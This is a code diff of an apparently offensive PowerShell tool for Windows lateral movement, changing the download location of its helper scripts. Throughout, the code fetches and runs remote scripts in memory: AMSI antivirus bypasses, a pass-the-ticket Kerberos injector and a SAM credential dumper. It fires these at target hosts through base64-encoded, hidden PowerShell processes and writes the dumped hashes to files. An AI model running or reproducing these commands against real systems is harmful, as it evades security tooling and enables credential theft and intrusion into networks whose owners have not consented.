@@ -106,7 +106,7 @@ function Find-WMILocalAdminAccess
 				if($Username.Contains(".\")){}
 				else{
 					klist purge > $null
-					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 				}
@@ -115,14 +115,14 @@ function Find-WMILocalAdminAccess
 				if($Username.Contains(".\")){}
 				else{
 					klist purge > $null
-					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 				}
 			}
 			if(($HASHorPassword) -eq "Ticket"){
 				klist purge > $null
-				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 				Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 			}
@@ -184,7 +184,7 @@ function Find-WMILocalAdminAccess
 				if($Username.Contains(".\")){}
 				else{
 					klist purge > $null
-					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 				}
@@ -193,14 +193,14 @@ function Find-WMILocalAdminAccess
 				if($Username.Contains(".\")){}
 				else{
 					klist purge > $null
-					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 				}
 			}
 			if(($HASHorPassword) -eq "Ticket"){
 				klist purge > $null
-				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 				Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 			}
@@ -358,7 +358,7 @@ if($Username){
 			
 			# Request ticket and import, then continue script
 			
-			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 
 			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 			
@@ -898,7 +898,7 @@ if($Username){
 			
 			# Request ticket and import, then continue script
 			
-			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 
 			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 			
@@ -1000,7 +1000,7 @@ if($Username){
 		
 		# Import Ticket
 		
-		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
+		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
 
 		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
 		
@@ -1532,7 +1532,7 @@ if($Username.Contains(".\") -AND $HASHorPassword -eq "HASH"){}
 
 else{
 	Write-Host "Attempting to dump SAM from targets..." -ForegroundColor Yellow
-	#iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1") > $null
+	#iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1") > $null
 	#iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')
 	#$PwshModule = (Get-Module)
 	#if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}
@@ -1555,7 +1555,7 @@ else{
 			
 			if($Username.Contains(".\")){
 				foreach ($SAMTarget in $SAMTargets) {
-					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget -d=$SAMTarget -u=$SMBExecUsername -p=$Password"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget -d=$SAMTarget -u=$SMBExecUsername -p=$Password"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
 					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
 					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
 				}
@@ -1563,7 +1563,7 @@ else{
 			
 			else{
 				foreach ($SAMTarget in $SAMTargets) {
-					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
 					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
 					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
 				}
@@ -1574,7 +1574,7 @@ else{
 			if($Username.Contains(".\")){}
 			else{
 				foreach ($SAMTarget in $SAMTargets) {
-					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
 					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
 					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
 				}
@@ -1583,7 +1583,7 @@ else{
 		
 		elseif($HASHorPassword -eq "Ticket"){
 			foreach ($SAMTarget in $SAMTargets) {
-				$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+				$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
 				$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
 				Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
 			}
@@ -1592,7 +1592,7 @@ else{
 
 	else{
 		foreach ($SAMTarget in $SAMTargets) {
-			$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command `"-target=$SAMTarget`" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+			$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command `"-target=$SAMTarget`" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
 			$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
 			Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
 		}
